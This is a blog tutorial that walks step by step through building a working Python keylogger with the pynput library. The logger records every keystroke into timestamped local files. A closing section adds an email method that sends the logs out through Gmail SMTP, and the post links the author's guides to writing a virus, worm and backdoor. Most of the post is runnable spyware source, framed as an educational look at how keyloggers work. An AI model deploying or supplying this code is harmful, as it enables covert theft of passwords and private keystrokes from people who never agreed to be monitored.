---
layout: single
title: "Write A Basic Keylogger in Python"
excerpt:  "Want to understand how keyloggers work? This blog post will guide you through writing a basic keylogger in Python. Keyloggers can be useful tools for monitoring computer activity, but they can also be used maliciously to steal sensitive information. By building a keylogger yourself, you can gain a deeper understanding of how they function and how to protect against them."
seo_title:  "Learn How Keyloggers Work Through Writing a Basic Keylogger in Python" 
seo_description:  Your  meta  description
header:
  image: "https://live.staticflickr.com/65535/51211036232_6916bf5c10_c.jpg"
  teaser: "https://live.staticflickr.com/65535/51211036232_6916bf5c10_c.jpg"
categories:
  - Security
tags:
  - Python
  - Tutorial
  - Keylogging
  - Keylogger
  - Trojan Horse
toc: true
toc_label: "Table of Contents"
toc_icon: "heart"
---


Keylogger is a simple yet effective program that can monitor a person's keyboard activities. It can be used to spy on a person's data (browsing activities, user credentials, etc.) or to monitor children activities.

It can be designed to store all keystrokes activities in a local log file or can be sent via email depending on how it is designed.

In this tutorial, we will see how to write a simple keylogger in python so that we understand the underlying theme of how it works. If you are interested to write other types of malwares, you can look into my previous posts:
* [Write a Simple Virus in Python](https://shantoroy.com/security/write-a-virus-in-python/)
* [Write a Worm (Malware) in Python](https://shantoroy.com/security/write-a-worm-malware-in-python/)
* [Write a Backdoor in Python](https://shantoroy.com/security/simple-backdoor-using-python/)


## Requirements
First, we need to install the module [pynput](https://pynput.readthedocs.io/en/latest/index.html). This module is used to control and monitor `keyboard` or `mouse/trackpad` activities.
```
$ pip install pynput
```

Now, for our simple program, we import the following modules

```python
from pynput.keyboard import Key, Listener
import  logging
import  os
from  datetime  import  datetime
```

## Writing a Keylogger Class
Let's create a keylogger class that contains all the methods we need to perform keylogger activities.

First, we need to create a directory that will contain our log files. We create a subdirectory named `log` in the current directory (from where we are running the script) if does not exist.

```python
class Keylogger:
     
    def create_log_directory(self):
        sub_dir = "log"
        cwd = os.getcwd()
        self.log_dir = os.path.join(cwd,sub_dir)
        if not os.path.exists(sub_dir):
            os.mkdir(sub_dir)
```

Next we create a static method that returns key information if a key is pressed. We need this function for later use.

```python
    @staticmethod
    def on_press(key):
        try:
            logging.info(str(key))
        except Exception as e:
            logging.info(e)
```

Finally, we need to report the keystroke information in a file. We create a text file and name with the current time as a prefix so that the program creates a new file each time it is run with a new filename. Also, we need to configure how we want the information to be stored in the log file using `logging.basicConfig` format. And then we use the `Listener` method to track keystroke information where we pass our previous static method as a callback.
```python
    def write_log_file(self):
        # time format example: '2021-05-29-171747'
        time = str(datetime.now())[:-7].replace(" ", "-").replace(":", "")
        # logging info in the file
        logging.basicConfig(
                 filename=(os.path.join(self.log_dir, time) + "log.txt"),
                 level=logging.DEBUG, 
                 format= '[%(asctime)s]: %(message)s',
             )
        
        with Listener(on_press=self.on_press) as listener:
            listener.join()
```

## Running the Script
Let's create the main function where we create an object of the `Keylogger` class, and then call the methods one after another.

```python
if  __name__ == "__main__":
	klog = Keylogger()
	klog.create_log_directory()
	klog.write_log_file()
```

Note that, while writing the code, I could avoid creating a class and use the methods as basic python functions. However, it is better to use classes so that you can add other functionalities when you need in the future.

Now, run the script from the terminal and check the created log files.
```sh
$ python keylogger.py
```

The whole is available [here](https://github.com/shantoroy/intro-2-cybersecurity-in-python/blob/master/keylogger/keylogger.py).

## Other Functionalities
You can add more functionalities, for example sending the logs via email or the log file as email attachments. 
```python
    def send_mail(self, email, password, TO, msg):
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            try:
                server.starttls()    # enable secure TLS mode
                server.login(email, password)
                server.sendmail(email, TO, msg)
            except Exception as e:
                pass
            finally:
                server.quit()
```
I will post details on how to send message via email or send an attachment with email in a seperate post.

That's it! Thanks for being with me. Cheers!



## References
* [pynput: Handling the keyboard](https://pynput.readthedocs.io/en/latest/keyboard.html)
* [Design a Keylogger in Python](https://www.tutorialspoint.com/design-a-keylogger-in-python)
* [How to Make a Keylogger in Python](https://www.thepythoncode.com/article/write-a-keylogger-python)
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTcwODExMjk3NiwtMTM2OTg2NTg2LDE3OT
E2NTU2MzgsLTE2NDc4MzE0OCwtNzQzNzk1MDc4LDEzMDIzMzE4
MzZdfQ==
-->